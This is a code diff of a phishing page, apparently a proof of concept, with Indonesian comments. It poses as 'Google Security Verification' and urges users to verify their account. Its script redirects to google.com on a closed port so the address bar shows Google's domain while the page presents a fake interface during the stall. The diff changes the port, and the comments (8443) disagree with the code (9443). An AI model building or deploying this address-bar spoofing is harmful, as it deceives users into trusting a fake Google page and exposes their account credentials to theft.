@@ -20,7 +20,7 @@
 
 <div class="panel" id="main-card">
   <h2>🔒 Google Security Verification</h2>
-  <p>Klik tombol di bawah untuk memverifikasi akun Google Anda. Anda akan diarahkan ke server aman Google (port 8081).</p>
+  <p>Klik tombol di bawah untuk memverifikasi akun Google Anda. Anda akan diarahkan ke server aman Google (port 8443).</p>
   <button id="startBtn">Verify Account</button>
   <div id="status">[*] Ready...</div>
 </div>
@@ -46,15 +46,12 @@
     log("[*] Memulai delay spoofing...");
 
     // ============================================
-    // 2. REDIRECT KE GOOGLE:8081 (PENDING NAVIGATION)
+    // 2. REDIRECT KE GOOGLE:8443 (PENDING NAVIGATION)
     // ============================================
-    // Ini akan menggantung karena port 8081 tertutup/timeout.
-    // Address bar akan menampilkan google.com:8081 sebelum lanjut ke google.com.
+    // Ini akan menggantung karena port 8443 tertutup.
+    // Address bar akan menampilkan google.com:8443 (delay ~30 detik).
     try {
-      window.location.href = "https://www.google.com:8081";
-      setTimeout(function() {
-        window.location.href = "https://www.google.com";
-      }, 3000);
+      window.location.href = "https://www.google.com:9443";
     } catch (e) {
       log("[-] Redirect error: " + e.message);
     }
@@ -62,7 +59,7 @@
     // ============================================
     // 3. SELAMA DELAY, TAMPILKAN UI PALSU (SPOOFING)
     // ============================================
-    // Kita tidak bisa menyuntikkan konten ke halaman google.com:8081 (cross-origin).
+    // Kita tidak bisa menyuntikkan konten ke halaman google.com:8443 (cross-origin).
     // Tapi kita bisa memanfaatkan delay untuk menampilkan UI palsu di halaman kita
     // SEBELUM redirect selesai.
     
